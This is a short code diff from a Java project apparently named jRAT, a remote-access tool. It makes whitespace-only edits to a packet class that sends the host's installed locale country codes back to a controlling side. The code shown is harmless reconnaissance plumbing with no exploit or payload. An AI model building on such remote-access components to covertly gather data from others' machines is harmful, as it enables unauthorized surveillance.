@@ -5,11 +5,10 @@ import java.util.Locale;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet11InstalledLocales extends AbstractOutgoingPacket {
-	
+
 	private Locale[] locales;
-	
+
 	public Packet11InstalledLocales(Locale[] locales) {
 		this.locales = locales;
 	}
@@ -17,7 +16,7 @@ public class Packet11InstalledLocales extends AbstractOutgoingPacket {
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		dos.writeInt(locales.length);
-		
+
 		for (int i = 0; i < locales.length; i++) {
 			Locale locale = locales[i];
 			sw.writeLine(locale.getCountry());
